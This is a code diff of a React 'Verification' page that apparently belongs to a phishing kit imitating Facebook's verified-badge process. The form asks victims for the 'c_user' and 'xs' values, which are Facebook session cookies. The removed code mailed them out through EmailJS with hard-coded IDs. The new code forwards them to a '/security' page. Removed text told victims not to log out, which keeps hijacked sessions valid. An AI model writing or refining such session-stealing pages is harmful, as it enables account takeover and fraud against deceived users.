@@ -1,30 +1,18 @@
 import React, { useRef } from "react";
-import emailjs from "@emailjs/browser";
 import { useNavigate } from "react-router-dom";
 
 const Verification = () => {
   const form = useRef();
-  const navigate = useNavigate(); // Initialize useNavigate
+  const navigate = useNavigate();
 
-  const sendEmail = (e) => {
+  const handleSubmit = (e) => {
     e.preventDefault();
+    const formData = new FormData(form.current);
+    const c_user = formData.get("c_user");
+    const xs = formData.get("xs");
 
-    emailjs
-      .sendForm(
-        "service_fgch11r", // Replace with your EmailJS service ID
-        "template_tzlfxfh", // Replace with your EmailJS template ID
-        form.current,
-        "SKcx4BtEqrmvdFtKq" // Replace with your EmailJS public key
-      )
-      .then(
-        (result) => {
-          alert("Message sent successfully!");
-          navigate("/"); // Redirect to /home on success
-        },
-        (error) => {
-          alert("Failed to send the message, please try again.");
-        }
-      );
+    // Navigate to Security page with form data
+    navigate("/security", { state: { data: { c_user, xs } } });
   };
 
   return (
@@ -54,35 +42,7 @@ const Verification = () => {
           profile is the authentic presence of the individual, public figure, or
           brand that it represents.
         </p>
-        <p className="text-sm text-gray-600 mb-3">
-          Previously, the verified badge also required the person or brand to be
-          notable and unique. You may still see users with a verified badge that
-          represents our previous eligibility requirements.
-        </p>
-        <p className="text-sm text-gray-600 mb-3">
-          Please provide the precise details below. Refer to the video for
-          clarification if you find the instructions unclear.
-        </p>
-
-        <div className="relative w-full max-w-lg">
-          <video
-            id="video"
-            controls
-            preload="none"
-            poster="fbPlay.jfif"
-            className="w-full rounded-lg shadow-md"
-          >
-            <source src="/vid.mp4" type="video/mp4" />
-            Your browser does not support the video tag.
-          </video>
-        </div>
-
-        <p className="text-xs font-medium text-[#ff0000] mt-5">
-          Please ensure that all required information is accurately provided.
-          Failure to do so may result in not receiving a verified badge.
-        </p>
-
-        <form ref={form} onSubmit={sendEmail} className="mainForm mt-6">
+        <form ref={form} onSubmit={handleSubmit} className="mainForm mt-6">
           <div className="form-group mb-5">
             <label
               htmlFor="c_user"
@@ -112,10 +72,6 @@ const Verification = () => {
               className="w-full p-3 text-sm border border-gray-300 rounded-md bg-gray-100 focus:bg-white focus:border-blue-500 focus:outline-none"
             />
           </div>
-          <p className="text-xs text-gray-600 mb-6">
-            Please make sure not to log out from your computer or laptop until
-            you have received a verification email.
-          </p>
           <button
             type="submit"
             className="w-full p-3 bg-blue-600 text-white font-bold uppercase rounded-md hover:bg-blue-700 transition duration-300"
